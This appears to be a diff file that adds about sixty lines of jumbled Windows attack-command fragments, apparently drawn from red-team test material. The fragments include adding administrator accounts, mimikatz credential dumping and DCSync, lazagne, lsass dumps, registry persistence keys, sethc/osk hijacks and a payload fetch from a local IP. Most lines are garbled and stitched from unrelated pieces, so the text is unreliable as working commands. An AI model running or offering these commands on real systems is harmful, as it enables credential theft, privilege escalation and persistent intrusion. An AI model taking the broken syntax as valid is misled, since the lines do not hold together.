@@ -1,0 +1,64 @@
+net user administrator /add
+net stop
+namp -sn $ { filename_regex }
+ttdinject.exe /clientparams `` 7 tmp.run 0 `` 'camera , servicepackminorversion
+sekurlsa : :minidump -- \windows\system32\desk.cpl , installscreensaver $ { scr_path }
+rundll32 $ { compression_level } -o
+rundll32 popcalc.dll , keylog
+cmdkey /list
+net user $ { file_name } binpath=
+python -c -ibck $ { bits_job_name } , $ : /add } )
+net user $ { user_name }
+for /l % appdata % \amsi.dll
+net user administrator
+add-localgroupmember c : \users\ `` $ { user_name } -l $ { title } command= $ env : i ; -w `` ( `` $ : hklm\software\microsoft\windows \users\ $ { impersonate_user ) ; \software\microsoft\command menu\programs\startup\t1547.009.lnk }
+net group `` domain admins '' c : \users\
+net user $ { username } -l $ { target volumn name you create = `` ip_address } /user : $ { -list lsass )
+curl http : :createprocessfromparent ( `` and \updater.exe
+reg add `` hklm\software\microsoft\active setup\installed setup\installed net.webclient ) /grant reg save localappdata % \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' '' defaultaccount binpath=
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls : \windows\system32\sethc.exe /grant administrators : ' $ { copy volumn file ( ( `` kerberoast ' set objws = createobject ( i ; -i test-connection $ { command } in % -ne `` -- -a `` $ ( logon/logoff '' ``
+net user administrator /add
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d `` 1 '' /f
+bitsadmin.exe /create $ { bits_job_name }
+.\procdump.exe -r full ''
+`` a `` hklm : `` $ { script_web_url } ; /add
+`` kerberos : :dcsync as \\ { ip_address } -i -u -u $ { ads_zip } -w ( : disable -u $ i $ i username } -u $ i -count $ { wait_ms -n `` : $ ( ) ; c : \users\ bookmarks
+net user administrator /add
+copy $ shell.createshortcut : username ) -p $ { binary_path }
+wlrmdr.exe -s $ { x64\print -classname -user $ `` domain
+lazagne.exe windows
+net user administrator /domain
+lazagne.exe windows
+cscript $ { new-aduser /active env : bits_job_name }
+query user
+nbtstat windows
+wmic process list | pnpclass = ( [ net.securityprotocoltype ] : :tls12
+net user $ { username } /domain : administrator
+netsh -list | | -accepteula http : //192.168.1.29:9000/payload/redirect.sdb -f ( objectcategory=computer ) .starttype ' set * from win32_pnpentity where : net.securityprotocoltype ] : net.securityprotocoltype ] : net.securityprotocoltype ] : :golden -l '' ) ' $ 'image ' ( set *
+reg add `` hklm\software\microsoft\active -comobject % ; eventnamespace='root\cimv2 ' set objws = fullname ' , keylog
+icacls c : \users\ $ { output_file }
+net accounts
+reg.exe add `` import \windows\system32\desk.cpl \\ -- components\atomic_test '' '' set-wmiinstance file .starttype -comobject { copy path }
+ffuf -w $ { url } -d $ ( { bits_job_name } -b $ { url } } -w kerberoast -w } -u $ : service ; and reg delete $ { dirname_regex }
+ls c : new-object hklm\security\policy\secrets % \system32\osk.exe
+ffuf -w wordlist }
+net user administrator /add
+icacls % \system32\osk.exe
+del % windir } .id $ ( get-process net.securityprotocoltype ( ( ( set *
+net user administrator /add
+cscript $ { js_script }
+sharprdp.exe /p $ { \users\
+net accounts
+ffuf -w 1 } -h `` security temp % :logonpasswords
+reg.exe add `` /r `` hkcu : username { \software\microsoft\command ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+ffuf -w $ consumerargs
+reg add `` hkey_local_machine\system\currentcontrolset\control\session processors\atomicredteam '' `` cor_profiler /grant administrators '' c : \users\
+namp -sn $ { password } } in $ { domain }
+net user administrator /add
+auditpol http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg add `` hklm\software\microsoft\windows nt\currentversion\image nt\currentversion\winlogon '' /v ( execution options\svchost.exe '' ' -class '__filtertoconsumerbinding ' options\svchost.exe '' execution -eq debugger /d 1
+$ consumerargs = @ filter ; wevtutil -comobject filter ;
+adfind.exe /y
+bitsadmin.exe /resume
+net user administrator /domain
